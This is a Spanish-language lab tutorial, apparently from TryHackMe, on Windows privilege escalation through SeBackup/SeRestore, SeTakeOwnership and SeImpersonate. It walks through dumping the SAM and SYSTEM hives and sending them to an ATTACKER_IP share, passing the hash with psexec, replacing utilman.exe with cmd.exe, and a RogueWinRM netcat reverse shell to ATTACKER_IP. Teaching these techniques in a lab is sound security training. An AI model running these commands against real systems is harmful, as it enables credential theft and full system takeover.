# Abusing dangerous privileges

### Windows Privileges

Los privilegios son derechos que tiene una cuenta para realizar tareas específicas relacionadas con el sistema. Estas tareas pueden ser tan simples como el privilegio de apagar la máquina hasta privilegios para eludir algunos controles de acceso basados ​​en DACL.

Cada usuario tiene un conjunto de privilegios asignados que se pueden verificar con el siguiente comando:

```shell-session
whoami /priv
```

Una lista completa de privilegios disponibles en sistemas Windows está disponible [aquí](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) . Desde el punto de vista de un atacante, sólo son de interés aquellos privilegios que nos permiten escalar en el sistema. Puede encontrar una lista completa de privilegios explotables en el proyecto [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github.

Si bien no analizaremos cada uno de ellos, mostraremos cómo abusar de algunos de los privilegios más comunes que puede encontrar.

### SeBackup/SeRestore

Los privilegios SeBackup y SeRestore permiten a los usuarios leer y escribir en cualquier archivo del sistema, ignorando cualquier DACL vigente. La idea detrás de este privilegio es permitir que ciertos usuarios realicen copias de seguridad de un sistema sin requerir privilegios administrativos completos.

Al tener este poder, un atacante puede escalar trivialmente privilegios en el sistema mediante el uso de muchas técnicas. El que veremos consiste en copiar las colmenas de registro SAM y SYSTEM para extraer el hash de contraseña del administrador local.

Esta cuenta forma parte del grupo "Operadores de copia de seguridad", al que de forma predeterminada se le conceden los privilegios SeBackup y SeRestore. Necesitaremos abrir un símbolo del sistema usando la opción "Abrir como administrador" para usar estos privilegios. Se nos pedirá que ingresemos nuestra contraseña nuevamente para obtener una consola elevada:

<figure><img src="../../.gitbook/assets/20231009173643.png" alt=""><figcaption></figcaption></figure>

Una vez en el símbolo del sistema, podemos verificar nuestros privilegios con el siguiente comando:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Para hacer una copia de seguridad de los hashes SAM y SYSTEM, podemos usar los siguientes comandos:

```shell-session
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.
```

Esto creará un par de archivos con el contenido de las colmenas del registro. Ahora podemos copiar estos archivos a nuestra máquina atacante usando SMB o cualquier otro método disponible. Para SMB, podemos usar impacket `smbserver.py`para iniciar un servidor SMB simple con un recurso compartido de red en el directorio actual de nuestro AttackBox:

```shell-session
user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

Esto creará un recurso compartido llamado que `public`apunta al `share`directorio, que requiere el nombre de usuario y la contraseña de nuestra sesión actual de Windows. Después de esto, podemos usar el `copy`comando en nuestra máquina Windows para transferir ambos archivos a nuestro AttackBox:

```shell-session
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

Y use impacket para recuperar los hashes de contraseña de los usuarios:

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

```

Finalmente podemos usar el hash del administrador para realizar un ataque Pass-the-Hash y obtener acceso a la máquina de destino con privilegios de SISTEMA:

```shell-session
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@MACHINE_IP
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

### Se Take Ownership

El privilegio SeTakeOwnership permite a un usuario tomar posesión de cualquier objeto en el sistema, incluidos archivos y claves de registro, lo que abre muchas posibilidades para que un atacante eleve los privilegios, como podríamos, por ejemplo, buscar un servicio que se ejecute como SISTEMA y tomar posesión. del ejecutable del servicio. Sin embargo, para esta tarea tomaremos un camino diferente.

Para obtener el privilegio SeTakeOwnership, debemos abrir un símbolo del sistema usando la opción "Abrir como administrador". Se nos pedirá que ingresemos nuestra contraseña para obtener una consola elevada:

<figure><img src="../../.gitbook/assets/20231009173643 (1).png" alt=""><figcaption></figcaption></figure>

Una vez en el símbolo del sistema, podemos verificar nuestros privilegios con el siguiente comando:

```shell-session
C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

`utilman.exe`Esta vez abusaremos para escalar privilegios. Utilman es una aplicación integrada de Windows que se utiliza para brindar opciones de facilidad de acceso durante la pantalla de bloqueo:

![comportamiento normal utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5437a609e41d982b320967667e9b97a.png)

Dado que Utilman se ejecuta con privilegios de SISTEMA, efectivamente obtendremos privilegios de SISTEMA si reemplazamos el binario original por cualquier carga útil que queramos. Como podemos tomar posesión de cualquier archivo, reemplazarlo es trivial.

Para reemplazar utilman, comenzaremos por tomar posesión de él con el siguiente comando:

```shell-session
C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".
```

Tenga en cuenta que ser propietario de un archivo no significa necesariamente que tenga privilegios sobre él, pero al ser propietario puede asignarse los privilegios que necesite. Para otorgarle a su usuario permisos completos sobre utilman.exe, puede usar el siguiente comando:

```shell-session
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files
```

Después de esto, reemplazaremos utilman.exe con una copia de cmd.exe:

```shell-session
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.
```

Para activar utilman, bloquearemos nuestra pantalla desde el botón de inicio:

<figure><img src="../../.gitbook/assets/20231009174005.png" alt=""><figcaption></figcaption></figure>

Y finalmente, proceda a hacer clic en el botón "Facilidad de acceso", que ejecuta utilman.exe con privilegios de SISTEMA. Como lo reemplazamos con una copia de cmd.exe, obtendremos un símbolo del sistema con privilegios de SISTEMA:

<figure><img src="../../.gitbook/assets/20231009174026.png" alt=""><figcaption></figcaption></figure>

### SeImpersonate / SeAssignPrimaryToken

Estos privilegios permiten que un proceso se haga pasar por otros usuarios y actúe en su nombre. La suplantación generalmente consiste en poder generar un proceso o hilo bajo el contexto de seguridad de otro usuario.

La suplantación se entiende fácilmente cuando se piensa en cómo funciona un servidor FTP. El servidor FTP debe restringir el acceso de los usuarios únicamente a los archivos que se les debe permitir ver.

Supongamos que tenemos un servicio FTP ejecutándose con el usuario `ftp`. Sin suplantación, si la usuaria Ann inicia sesión en el servidor FTP e intenta acceder a sus archivos, el servicio FTP intentará acceder a ellos con su token de acceso en lugar del de Ann:

<figure><img src="../../.gitbook/assets/20231009174045.png" alt=""><figcaption></figcaption></figure>

Hay varias razones por las que usar el token de ftp no es la mejor idea: - Para que los archivos se entreguen correctamente, el usuario debería poder acceder a ellos `ftp`. En el ejemplo anterior, el servicio FTP podría acceder a los archivos de Ann, pero no a los archivos de Bill, ya que el DACL en los archivos de Bill no permite al usuario `ftp`. Esto agrega complejidad ya que debemos configurar manualmente permisos específicos para cada archivo/directorio servido. - Para el sistema operativo, el usuario accede a todos los archivos `ftp`, independientemente de qué usuario esté actualmente conectado al servicio FTP. Esto imposibilita delegar la autorización al sistema operativo; por lo tanto, el servicio FTP debe implementarlo. - Si el servicio FTP se viera comprometido en algún momento, el atacante obtendría acceso inmediatamente a todas las carpetas a las que se encuentra el`ftp`el usuario tiene acceso.

Si, por el contrario, el usuario del servicio FTP tiene el privilegio SeImpersonate o SeAssignPrimaryToken, todo esto se simplifica un poco, ya que el servicio FTP puede tomar temporalmente el token de acceso del usuario que inicia sesión y usarlo para realizar cualquier tarea en su beneficio:

<figure><img src="../../.gitbook/assets/20231009174103.png" alt=""><figcaption></figcaption></figure>

Ahora, si la usuaria Ann inicia sesión en el servicio FTP y dado que el usuario ftp tiene privilegios de suplantación, puede tomar prestado el token de acceso de Ann y usarlo para acceder a sus archivos. De esta manera, los archivos no necesitan proporcionar acceso al usuario `ftp`de ninguna manera y el sistema operativo maneja la autorización. Dado que el servicio FTP se hace pasar por Ann, no podrá acceder a los archivos de Jude o Bill durante esa sesión.

Como atacantes, si logramos tomar el control de un proceso con privilegios SeImpersonate o SeAssignPrimaryToken, podemos suplantar a cualquier usuario que se conecte y se autentique en ese proceso.

En los sistemas Windows, encontrará que las CUENTAS DE SERVICIO LOCAL y DE SERVICIO DE RED ya tienen dichos privilegios. Dado que estas cuentas se utilizan para generar servicios que utilizan cuentas restringidas, tiene sentido permitirles suplantar a los usuarios que se conectan si el servicio lo necesita. Internet Information Services (IIS) también creará una cuenta predeterminada similar llamada "iis apppool\defaultapppool" para aplicaciones web.

Para elevar los privilegios utilizando dichas cuentas, un atacante necesita lo siguiente: 1. Generar un proceso para que los usuarios puedan conectarse y autenticarse en él para que se produzca la suplantación. 2. Encuentre una manera de obligar a los usuarios privilegiados a conectarse y autenticarse en el proceso malicioso generado.

Usaremos el exploit RogueWinRM para cumplir ambas condiciones.

Comencemos asumiendo que ya hemos comprometido un sitio web que se ejecuta en IIS y que hemos instalado un shell web en la siguiente dirección:

`http://MACHINE_IP/`

Podemos usar el shell web para verificar los privilegios asignados de la cuenta comprometida y confirmar que tenemos ambos privilegios de interés para esta tarea:

<figure><img src="../../.gitbook/assets/20231009174124.png" alt=""><figcaption></figcaption></figure>

Para utilizar RogueWinRM, primero debemos cargar el exploit en la máquina de destino. Para su comodidad, esto ya se hizo y puede encontrar el exploit en la `C:\tools\`carpeta.

El exploit RogueWinRM es posible porque cada vez que un usuario (incluidos los usuarios sin privilegios) inicia el servicio BITS en Windows, crea automáticamente una conexión al puerto 5985 utilizando privilegios del SISTEMA. El puerto 5985 se utiliza normalmente para el servicio WinRM, que es simplemente un puerto que expone una consola Powershell para su uso remoto a través de la red. Piense en ello como SSH, pero usando Powershell.

Si, por alguna razón, el servicio WinRM no se está ejecutando en el servidor víctima, un atacante puede iniciar un servicio WinRM falso en el puerto 5985 y detectar el intento de autenticación realizado por el servicio BITS al iniciarse. Si el atacante tiene privilegios de SeImpersonate, puede ejecutar cualquier comando en nombre del usuario que se conecta, que es SISTEMA.

Antes de ejecutar el exploit, iniciaremos un detector de netcat para recibir un shell inverso en la máquina de nuestro atacante:

```shell-session
user@attackerpc$ nc -lvp 4442
```

Y luego, use nuestro shell web para activar el exploit RogueWinRM usando el siguiente comando:

```shell-session
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

<figure><img src="../../.gitbook/assets/20231009174151.png" alt=""><figcaption></figcaption></figure>

**Nota:** El exploit puede tardar hasta 2 minutos en funcionar, por lo que su navegador puede parecer que no responde durante un momento. Esto sucede si ejecuta el exploit varias veces, ya que debe esperar a que se detenga el servicio BITS antes de iniciarlo nuevamente. El servicio BITS se detendrá automáticamente después de 2 minutos de iniciarse.

El `-p`parámetro especifica el ejecutable que ejecutará el exploit, que `nc64.exe`en este caso es. El `-a`parámetro se utiliza para pasar argumentos al ejecutable. Como queremos que nc64 establezca un shell inverso contra nuestra máquina atacante, los argumentos para pasar a netcat serán `-e cmd.exe ATTACKER_IP 4442`.

Si todo estuvo configurado correctamente, debería esperar un shell con privilegios de SISTEMA:

```shell-session
user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```
